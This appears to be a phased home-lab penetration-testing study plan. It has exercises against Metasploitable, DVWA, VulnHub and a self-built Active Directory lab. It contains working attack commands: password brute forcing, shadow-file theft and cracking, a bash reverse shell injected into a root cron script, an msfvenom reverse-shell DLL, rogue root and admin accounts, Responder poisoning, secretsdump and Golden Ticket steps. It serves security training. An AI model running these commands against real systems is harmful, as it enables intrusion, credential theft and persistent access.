# 📋 Structured Practice Plan — Hands-On Exercises

> **This plan maps directly to every topic you've studied.** Each section has specific
> exercises you can do in your free home lab. Follow the phases in order — each builds
> on the previous one.

---

## 🗺️ Learning Path Overview

```
Phase 1: Information Gathering (Week 1-2)
    ↓
Phase 2: Password Attacks (Week 3)
    ↓
Phase 3: File Transfer Techniques (Week 4)
    ↓
Phase 4: Linux Privilege Escalation (Week 5-6)
    ↓
Phase 5: Windows Privilege Escalation (Week 7-8)
    ↓
Phase 6: Active Directory Attacks (Week 9-12)
    ↓
Phase 7: Port Redirection & Tunneling (Week 13)
    ↓
Phase 8: Full Attack Chains (Week 14+)
```

---

## Phase 1: Information Gathering 🔍

> **Your notes**: `information_gathering/` folder
> **Practice on**: Metasploitable 2 (192.168.56.20)

### Exercise 1.1 — Passive Information Gathering

**Related doc**: `passive_information_gathering.md`

| # | Task | Command/Tool | What to Look For |
|---|------|-------------|-----------------|
| 1 | Google dork your own domain | `site:example.com filetype:pdf` | Practice dork syntax |
| 2 | Use Shodan (free account) | https://shodan.io | Search for `apache 2.2` |
| 3 | WHOIS lookup | `whois example.com` | Registrar, nameservers |
| 4 | DNS lookup | `nslookup example.com` | A records, MX records |
| 5 | Use theHarvester | `theHarvester -d example.com -b google` | Emails, subdomains |

> ⚡ **Practice Tip**: Use your own social media, old websites, or intentional targets like `scanme.nmap.org`

---

### Exercise 1.2 — Active Information Gathering with Nmap

**Related doc**: `nmap.md`, `active_info_gathering.md`

**Target**: Metasploitable (192.168.56.20)

```bash
# Exercise 1: Basic host discovery
nmap -sn 192.168.56.0/24

# Exercise 2: TCP SYN scan (stealth scan)
nmap -sS 192.168.56.20

# Exercise 3: Service version detection
nmap -sV 192.168.56.20

# Exercise 4: OS detection
nmap -O 192.168.56.20

# Exercise 5: Aggressive scan (combines -sV, -sC, -O, --traceroute)
nmap -A 192.168.56.20

# Exercise 6: Full port scan
nmap -p- 192.168.56.20

# Exercise 7: Specific port range
nmap -p 1-1000 192.168.56.20

# Exercise 8: UDP scan (slower but important!)
sudo nmap -sU --top-ports 20 192.168.56.20

# Exercise 9: Script scan for vulnerabilities
nmap --script vuln 192.168.56.20

# Exercise 10: Save results in all formats
nmap -sV -sC -oA scan_results 192.168.56.20
```

**📝 After each scan, answer these questions:**
- [ ] How many open ports did you find?
- [ ] What services and versions are running?
- [ ] Which services look potentially vulnerable?
- [ ] What OS is the target running?

---

### Exercise 1.3 — DNS Enumeration

**Related docs**: `dnsenum.md`, `dnsrecon.md`

```bash
# Exercise 1: Basic DNS enumeration
dnsenum 192.168.56.20

# Exercise 2: DNS recon
dnsrecon -d 192.168.56.20 -t std

# Exercise 3: Zone transfer attempt (against Metasploitable)
dig axfr @192.168.56.20

# Exercise 4: Try against intentional targets
dnsrecon -d zonetransfer.me -t axfr
```

---

### Exercise 1.4 — SMB Enumeration

**Related doc**: `smb_enumeration.md`

**Target**: Metasploitable port 139/445

```bash
# Exercise 1: List SMB shares
smbclient -L //192.168.56.20 -N

# Exercise 2: Connect to a share
smbclient //192.168.56.20/tmp -N

# Exercise 3: Enumerate with enum4linux
enum4linux -a 192.168.56.20

# Exercise 4: Use nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.56.20

# Exercise 5: Check for known SMB vulnerabilities
nmap --script smb-vuln* -p 139,445 192.168.56.20
```

**📝 Document:**
- [ ] What shares are available?
- [ ] Can you access any without credentials?
- [ ] What users did you find?
- [ ] Are there any SMB vulnerabilities?

---

### Exercise 1.5 — SMTP Enumeration

**Related doc**: `smtp_enumeration.md`

**Target**: Metasploitable port 25

```bash
# Exercise 1: Banner grab
nc 192.168.56.20 25

# Exercise 2: VRFY command (check if user exists)
# After connecting with netcat, type:
VRFY root
VRFY admin
VRFY msfadmin

# Exercise 3: Use smtp-user-enum
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20

# Exercise 4: Nmap SMTP scripts
nmap --script smtp-enum-users -p 25 192.168.56.20
```

---

## Phase 2: Password Attacks 🔑

> **Your notes**: `attacks/` folder
> **Practice on**: Metasploitable 2

### Exercise 2.1 — Understanding Hashes

**Related doc**: `password_cracking_hashes_types.md`

```bash
# Exercise 1: Identify hash types
# Use hash-identifier or hashid
hash-identifier
# Paste these practice hashes and identify them:
# 5f4dcc3b5aa765d61d8327deb882cf99     (What type?)
# $1$xyz$abcdefghijklmnop              (What type?)
# $6$rounds=5000$salt$hash             (What type?)

# Exercise 2: Create your own hashes
echo -n "password123" | md5sum
echo -n "password123" | sha256sum
openssl passwd -1 -salt xyz password123

# Exercise 3: Crack with hashcat (use a small wordlist first)
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Exercise 4: Crack with John the Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> **Note**: First time using rockyou.txt? Decompress it:
> `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

### Exercise 2.2 — Brute Force with Hydra

**Related doc**: `hydra.md`

**Target**: Metasploitable 2

```bash
# Exercise 1: Brute force FTP (port 21)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ftp -t 4

# Exercise 2: Brute force SSH (port 22)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ssh -t 4

# Exercise 3: Brute force Telnet (port 23)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 telnet -t 4

# Exercise 4: Use a smaller custom wordlist for speed
echo -e "admin\npassword\nmsfadmin\nroot\ntest123" > small_wordlist.txt
hydra -l msfadmin -P small_wordlist.txt 192.168.56.20 ssh

# Exercise 5: Brute force HTTP form (DVWA login)
hydra -l admin -P small_wordlist.txt 192.168.56.20 http-get-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**📝 Questions to answer:**
- [ ] Which services were cracked successfully?
- [ ] How long did each attack take?
- [ ] What's the difference between `-l` (single user) and `-L` (user list)?

---

### Exercise 2.3 — Full Password Attack Chain

**Related doc**: `password_attacks.md`, `attack_chain.md`

```bash
# Step 1: Enumerate users via SMTP
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20

# Step 2: Create a targeted username list from results
echo -e "root\nmsfadmin\nuser\nservice" > users.txt

# Step 3: Brute force SSH with the discovered users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ssh -t 4

# Step 4: Login with discovered credentials
ssh msfadmin@192.168.56.20

# Step 5: Once in, grab /etc/shadow for offline cracking
cat /etc/shadow

# Step 6: Crack the hashes offline
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Phase 3: File Transfer Practice 📁

> **Your notes**: `file_transfer/` folder (10 detailed docs!)
> **Practice on**: Kali ↔ Metasploitable

### Exercise 3.1 — HTTP File Transfer

**Related doc**: `01_http_file_transfer.md`

```bash
# On Kali — start a simple HTTP server
echo "This is a test file from Kali" > test_file.txt
python3 -m http.server 8080

# On Metasploitable — download the file
wget http://192.168.56.10:8080/test_file.txt
# or
curl http://192.168.56.10:8080/test_file.txt -o test_file.txt
```

### Exercise 3.2 — Netcat File Transfer

**Related doc**: `06_netcat_file_transfer.md`

```bash
# On Kali (receiver) — listen for incoming file
nc -lvnp 4444 > received_file.txt

# On Metasploitable (sender) — send the file
nc 192.168.56.10 4444 < /etc/passwd
```

### Exercise 3.3 — SMB File Transfer

**Related doc**: `04_SMB_file_transfer.md`

```bash
# On Kali — set up an SMB share using impacket
sudo impacket-smbserver share $(pwd) -smb2support

# On target — access the share
smbclient //192.168.56.10/share -N
# Then: get test_file.txt
```

### Exercise 3.4 — SCP/SSH Transfer

**Related doc**: `07_SSH_SCP_SFTP_transfer.md`

```bash
# From Kali — copy file TO Metasploitable
scp test_file.txt msfadmin@192.168.56.20:/tmp/

# From Kali — copy file FROM Metasploitable
scp msfadmin@192.168.56.20:/etc/passwd ./grabbed_passwd.txt
```

### Exercise 3.5 — FTP Transfer

**Related doc**: `05_FTP_TFTP_transfer.md`

```bash
# Connect to Metasploitable FTP
ftp 192.168.56.20
# Login: msfadmin / msfadmin

# Download a file
get /etc/passwd

# Upload a file
put test_file.txt
```

### Exercise 3.6 — Encoding & Stealth Transfer

**Related doc**: `08_encoding_stealth_transfer.md`

```bash
# Exercise 1: Base64 encode/decode a file
base64 /etc/passwd > encoded.txt
cat encoded.txt  # See the encoded content
base64 -d encoded.txt > decoded.txt
diff /etc/passwd decoded.txt  # Should be identical

# Exercise 2: Transfer via base64 (no file transfer tools needed!)
# On source: encode file
base64 -w 0 /etc/passwd
# Copy the output string
# On destination: decode
echo "<paste_base64_string>" | base64 -d > passwd_copy.txt
```

**📝 Challenge**: Transfer the file `/etc/shadow` from Metasploitable to Kali using at least 3 different methods. Document which method was easiest and which was stealthiest.

---

## Phase 4: Linux Privilege Escalation 🐧

> **Your notes**: `linux_prev_esca/` folder
> **Practice on**: Metasploitable 2 + VulnHub machines

### Exercise 4.1 — Manual Enumeration

**Related doc**: `linux_enumeration.md`

Login to Metasploitable as `msfadmin` and gather information:

```bash
# Exercise 1: Basic system info
whoami
id
hostname
uname -a
cat /etc/os-release

# Exercise 2: Find other users
cat /etc/passwd | grep -v nologin
cat /etc/passwd | grep "/bin/bash"

# Exercise 3: Check sudo permissions
sudo -l

# Exercise 4: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exercise 5: Find writable directories
find / -writable -type d 2>/dev/null

# Exercise 6: Check cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Exercise 7: Check running processes
ps aux | grep root

# Exercise 8: Look for interesting files
find / -name "*.conf" 2>/dev/null | head -20
find / -name "*.bak" 2>/dev/null
find / -name "*.log" 2>/dev/null | head -20

# Exercise 9: Check network connections
netstat -tlnp

# Exercise 10: Check environment variables
env
echo $PATH
```

**📝 Create a checklist of everything you found!**

---

### Exercise 4.2 — SUID/Sudo Abuse

**Related docs**: `abusing_bineries_sudo.md`, `root_understanding_permissions.md`

```bash
# Step 1: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Step 2: For each SUID binary, check GTFOBins
# Visit: https://gtfobins.github.io/
# Search for the binary name → look for "SUID" section

# Step 3: Try common SUID exploits

# Example: If /usr/bin/find has SUID
find . -exec /bin/sh -p \;

# Example: If /usr/bin/vim has SUID
vim -c ':!/bin/sh'

# Example: If /usr/bin/nmap has SUID (old version)
nmap --interactive
!sh

# Step 4: Check sudo permissions
sudo -l
# If you see (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
# Then press: !/bin/bash
```

---

### Exercise 4.3 — Cron Job Exploitation

**Related doc**: `cronjob.md`

```bash
# Step 1: Check crontab
cat /etc/crontab

# Step 2: Look for writable scripts run by root
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Step 3: If you find a writable script run by root, add a reverse shell
# Example: If /opt/cleanup.sh is run by root and writable by you
echo 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1' >> /opt/cleanup.sh

# Step 4: On Kali, start a listener
nc -lvnp 4444

# Step 5: Wait for the cron job to execute — you get a root shell!
```

---

### Exercise 4.4 — Weak File Permissions

**Related doc**: `weak_file_permissions.md`

```bash
# Exercise 1: Check if /etc/shadow is readable
cat /etc/shadow
# If readable — copy the hashes and crack them!

# Exercise 2: Check if /etc/passwd is writable
ls -la /etc/passwd
# If writable — add a root user!
openssl passwd -1 -salt evil password123
# Add to /etc/passwd:
echo 'evilroot:$1$evil$<hash>:0:0::/root:/bin/bash' >> /etc/passwd
su evilroot

# Exercise 3: Find world-writable files
find / -writable -type f 2>/dev/null

# Exercise 4: Find files with no owner
find / -nouser -type f 2>/dev/null
```

---

### Exercise 4.5 — Automated Enumeration with LinPEAS

**Related doc**: `automated_enumeration.md`

```bash
# On Kali — download LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target (use any method from Phase 3!)
python3 -m http.server 8080
# On Metasploitable:
wget http://192.168.56.10:8080/linpeas.sh

# Run it
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Review the output — focus on RED and YELLOW highlights
```

**📝 Document at least 3 potential privilege escalation vectors that LinPEAS found!**

---

### 🏆 Linux PrivEsc Challenge

**Download a VulnHub machine and get root!**

Recommended: **Kioptrix Level 1** (https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

1. Import the VM
2. Add to `hacklab` network
3. Find it with `nmap -sn 192.168.56.0/24`
4. Enumerate → Exploit → Get root!

---

## Phase 5: Windows Privilege Escalation 🪟

> **Your notes**: `Windows_Privilege_Esclation/` folder (14 docs!)
> **Practice on**: Windows 10 Evaluation VM or TryHackMe free rooms

### Exercise 5.1 — Situational Awareness

**Related docs**: `PrivEsc_situation_awareness.md`, `situational_awareness.md`, `tools_situational_awwareness.md`

```powershell
# Exercise 1: Gather system info
systeminfo
hostname
whoami /all

# Exercise 2: Check current privileges
whoami /priv

# Exercise 3: List users and groups
net user
net localgroup administrators

# Exercise 4: Check network info
ipconfig /all
netstat -ano

# Exercise 5: Find running services
wmic service list brief
tasklist /svc

# Exercise 6: Check installed programs
wmic product get name,version

# Exercise 7: Check scheduled tasks
schtasks /query /fo LIST

# Exercise 8: Look for interesting files
dir /s /b C:\Users\*.txt 2>nul
dir /s /b C:\Users\*.ini 2>nul
dir /s /b C:\Users\*.config 2>nul
```

---

### Exercise 5.2 — Service Exploitation

**Related docs**: `leveraging_windows_services.md`, `services_permissions.md`

```powershell
# Step 1: Find services with weak permissions
# Use accesschk from Sysinternals (download from Microsoft)
accesschk.exe /accepteula -uwcqv "Everyone" *

# Step 2: Or use PowerUp (from PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Step 3: If you find a modifiable service
sc qc <vulnerable_service>
sc config <vulnerable_service> binpath= "cmd.exe /c net user hacker Password123! /add"
sc stop <vulnerable_service>
sc start <vulnerable_service>
```

---

### Exercise 5.3 — DLL Hijacking

**Related doc**: `dll_hijacking.md`

```powershell
# Step 1: Find programs with missing DLLs (use Process Monitor)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Step 2: Check if you can write to the application directory
icacls "C:\Program Files\VulnerableApp\"

# Step 3: Create a malicious DLL
# On Kali:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f dll > evil.dll

# Step 4: Transfer the DLL to the target's writable directory
# Step 5: Start listener on Kali, then restart the vulnerable service
```

---

### Exercise 5.4 — Scheduled Tasks

**Related doc**: `scheduled_tasks.md`

```powershell
# Step 1: List scheduled tasks
schtasks /query /fo LIST /v

# Step 2: Look for tasks that run as SYSTEM and reference writable paths
# Step 3: Replace the executable or script with a malicious one

# Example: If a task runs C:\Tasks\backup.bat as SYSTEM
echo "cmd.exe /c net user hacker Password123! /add" > C:\Tasks\backup.bat
echo "cmd.exe /c net localgroup administrators hacker /add" >> C:\Tasks\backup.bat
```

---

### Exercise 5.5 — Token Impersonation

**Related docs**: `selmpersonate_prev.md`, `SeBackup_prevEsca.md`

```powershell
# Check if you have SeImpersonatePrivilege
whoami /priv

# If yes, use tools like:
# - JuicyPotato
# - PrintSpoofer
# - GodPotato

# Example with PrintSpoofer:
PrintSpoofer.exe -i -c cmd
# You now have SYSTEM!
```

---

### Exercise 5.6 — PowerShell History Mining

**Related docs**: `powershell_history.md`, `powershell_goldmine.md`

```powershell
# Check PowerShell history
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Search for passwords in history
Select-String -Path (Get-PSReadlineOption).HistorySavePath -Pattern "password"

# Search for credentials in environment variables
Get-ChildItem Env: | Where-Object { $_.Value -like "*pass*" }

# Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

### 🏆 Windows PrivEsc Challenges (Free!)

| Platform | Link | What to Do |
|----------|------|------------|
| TryHackMe | "Windows PrivEsc" room | Guided exercises |
| TryHackMe | "Windows PrivEsc Arena" | Practice all techniques |
| HackTheBox | Starting Point "Archetype" | Windows SQL injection → PrivEsc |

---

## Phase 6: Active Directory Attacks 🏢

> **Your notes**: `active_directory/` + `AD_hacking/` folders
> **Practice on**: Free AD labs (see setup below)

### Setting Up a Free AD Lab

**Related doc**: `AD_hacking/AD_lab_setup_guide.md`

You have a detailed guide already! Here's a quick reminder:

1. Download **Windows Server 2019/2022 Evaluation** (free 180-day trial)
   - https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
2. Download **Windows 10 Enterprise Evaluation** (free 90-day trial)
3. Set up:
   ```
   DC01 (Windows Server) → Domain Controller
   WS01 (Windows 10)     → Domain-joined workstation
   Kali                  → Attacker
   All on hacklab internal network
   ```

---

### Exercise 6.1 — AD Enumeration with PowerView

**Related docs**: `AD_using_powerview.md`, `AD_hacking/powerview_AD_enumeration.md`

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Exercise 1: Get domain info
Get-Domain
Get-DomainController

# Exercise 2: Enumerate users
Get-DomainUser | Select-Object samaccountname, description
Get-DomainUser -SPN  # Find Kerberoastable accounts

# Exercise 3: Enumerate groups
Get-DomainGroup | Select-Object name
Get-DomainGroupMember -Identity "Domain Admins"

# Exercise 4: Enumerate computers
Get-DomainComputer | Select-Object name, operatingsystem

# Exercise 5: Find shares
Find-DomainShare -CheckShareAccess

# Exercise 6: Find local admin access
Find-LocalAdminAccess
```

---

### Exercise 6.2 — BloodHound Enumeration

**Related doc**: `AD_hacking/bloodhound_AD_enumeration.md`

```bash
# On Kali — install BloodHound
sudo apt install bloodhound neo4j -y

# Start neo4j database
sudo neo4j console

# In another terminal, start BloodHound
bloodhound

# Collect data using SharpHound (on Windows target)
.\SharpHound.exe -c All
# Or from Kali using bloodhound-python
bloodhound-python -u <user> -p <password> -d <domain> -ns <DC_IP> -c All

# Import the .zip file into BloodHound
# Look for: "Shortest Path to Domain Admin"
```

---

### Exercise 6.3 — Kerberoasting

**Related doc**: `AD_hacking/kerberoasting.md`

```bash
# From Kali with valid domain credentials
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request

# Save the hash and crack it
hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Exercise 6.4 — AS-REP Roasting

**Related doc**: `AD_hacking/AS_REP_roasting.md`

```bash
# Find users without pre-authentication
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt

# Crack the hash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Exercise 6.5 — LLMNR/NBT-NS Poisoning

**Related doc**: `AD_hacking/LLMNR_NBNS_poisoning.md`

```bash
# On Kali — start Responder
sudo responder -I eth1 -rdw

# Wait for a Windows user to mistype a hostname or browse the network
# Responder will capture NTLMv2 hashes

# Crack captured hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Exercise 6.6 — Lateral Movement

**Related doc**: `AD_hacking/lateral_movement.md`

```bash
# PSExec (remote shell)
impacket-psexec <domain>/<user>:<password>@<target_ip>

# WMIExec (stealthier)
impacket-wmiexec <domain>/<user>:<password>@<target_ip>

# Evil-WinRM (if WinRM is enabled, port 5985)
evil-winrm -i <target_ip> -u <user> -p <password>

# CrackMapExec (test credentials across multiple hosts)
crackmapexec smb 192.168.56.0/24 -u <user> -p <password>
```

---

### Exercise 6.7 — Golden/Silver Ticket Attacks

**Related doc**: `AD_hacking/golden_silver_ticket_attacks.md`

```bash
# After getting Domain Admin — dump the krbtgt hash
impacket-secretsdump <domain>/<admin>:<password>@<DC_IP>

# Create a Golden Ticket with mimikatz
# kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<hash> /ptt

# Verify access
dir \\DC01\C$
```

---

## Phase 7: Port Redirection & Tunneling 🔀

> **Your notes**: `port_redir_tunneling/` folder
> **Practice on**: Multi-machine lab setup

### Exercise 7.1 — SSH Tunneling

**Related doc**: `port_redir_tunneling/overview.md`

```bash
# Scenario: You've compromised Machine A and want to reach Machine B
# (which is only accessible from Machine A)

# Local port forwarding — access remote service through your machine
ssh -L 8080:192.168.56.30:80 msfadmin@192.168.56.20
# Now http://localhost:8080 reaches Machine B's port 80

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 msfadmin@192.168.56.20
# Configure proxychains to use socks5://127.0.0.1:9050
# Then: proxychains nmap 192.168.56.30

# Remote port forwarding — expose your service through target
ssh -R 8080:localhost:80 msfadmin@192.168.56.20
```

### Exercise 7.2 — Chisel (HTTP-based Tunneling)

```bash
# On Kali (server mode)
./chisel server --reverse -p 8000

# On target (client mode)
./chisel client 192.168.56.10:8000 R:9050:socks

# Now use proxychains with socks5://127.0.0.1:9050
proxychains nmap -sT 192.168.56.30
```

---

## Phase 8: Full Attack Chains 🎯

> **Your notes**: `attacks/attack_chain.md`
> **Now tie everything together!**

### 🏆 Challenge 1: Metasploitable Full Compromise

**Goal**: Get root on Metasploitable using a complete attack chain.

```
Step 1: Information Gathering
    → Nmap scan, find open ports and services
    
Step 2: Vulnerability Research
    → Google the service versions for known exploits
    
Step 3: Initial Access (choose one)
    → Exploit vsftpd 2.3.4 backdoor (port 21)
    → Exploit Samba (port 139/445)
    → Exploit Tomcat (port 8180)
    → Brute force SSH credentials
    
Step 4: Post-Exploitation
    → Enumerate the system
    → Transfer tools (LinPEAS)
    → Find privilege escalation vectors
    
Step 5: Privilege Escalation
    → Escalate to root
    
Step 6: Document Everything!
```

---

### 🏆 Challenge 2: DVWA All Vulnerabilities

**Goal**: Complete all DVWA challenges at every security level.

| Vulnerability | Low | Medium | High |
|--------------|-----|--------|------|
| Brute Force | [ ] | [ ] | [ ] |
| Command Injection | [ ] | [ ] | [ ] |
| CSRF | [ ] | [ ] | [ ] |
| File Inclusion | [ ] | [ ] | [ ] |
| File Upload | [ ] | [ ] | [ ] |
| SQL Injection | [ ] | [ ] | [ ] |
| SQL Injection (Blind) | [ ] | [ ] | [ ] |
| XSS (Reflected) | [ ] | [ ] | [ ] |
| XSS (Stored) | [ ] | [ ] | [ ] |
| XSS (DOM) | [ ] | [ ] | [ ] |

---

### 🏆 Challenge 3: VulnHub Machine

**Pick one and get root:**

| Machine | Difficulty | Download |
|---------|-----------|----------|
| Kioptrix 1 | ⭐ Easy | vulnhub.com |
| DC-1 | ⭐ Easy | vulnhub.com |
| Basic Pentesting 1 | ⭐ Easy | vulnhub.com |
| Mr. Robot | ⭐⭐ Medium | vulnhub.com |
| Stapler | ⭐⭐ Medium | vulnhub.com |

**Write a full report for each machine:**
1. Summary
2. Enumeration findings
3. Exploitation steps
4. Privilege escalation
5. Lessons learned

---

## 📝 How to Track Your Progress

Create a file called `progress.md` and track your exercises:

```markdown
# My Practice Progress

## Phase 1: Information Gathering
- [x] Nmap basic scans
- [x] Nmap service detection
- [ ] DNS enumeration
- [ ] SMB enumeration
- [ ] SMTP enumeration

## Phase 2: Password Attacks
- [ ] Hash identification
- [ ] Cracking with hashcat
- [ ] Hydra brute force
...
```

---

**Next**: Check out [03_free_resources.md](./03_free_resources.md) for a full list of free platforms! 🚀
